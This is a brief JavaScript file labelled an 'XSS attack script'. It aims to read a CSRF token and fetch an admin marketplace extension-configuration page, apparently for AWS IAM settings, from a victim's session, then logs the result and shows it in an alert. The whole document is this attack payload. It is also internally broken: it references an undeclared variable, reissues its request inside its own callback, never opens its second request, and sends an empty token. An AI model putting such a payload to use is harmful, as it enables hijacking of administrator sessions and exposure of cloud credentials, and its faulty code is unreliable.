console.log("XSS attack script loaded")
var xhr = new XMLHttpRequest(); 
xhr.onreadystatechange = function () { 
    if (xhr.readyState === 4) { 
        console.log(xhr.getAllResponseHeaders()); console.log(xhr.responseText); 
        console.log("XSS attack script step 2")
        var csrf_token = xhr.getResponseHeader("x-csrf-token")
        var xhrget = new XMLHttpRequest();
        xhrpost.onreadystatechange = function () { 
            if (xhrget.readyState === 4) { 
                console.log(xhrget.getAllResponseHeaders()); console.log(xhrget.responseText); 
            }
        }

        xhr.open('get', '/admin/marketplace/installed_extensions/9429/19135/edit_configs?display_name=AWS+IAM+-+Orch&installation_type=settings&type=1', true);
        xhr.setRequestHeader('Accept', 'application/json, text/javascript, */*; q=0.01'); 
        xhr.setRequestHeader('X-CSRF-Token', ''); 
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest'); 
        xhr.send();
    }
    console.log(xhrget.responseText);
    alert(xhrget.responseText);
};
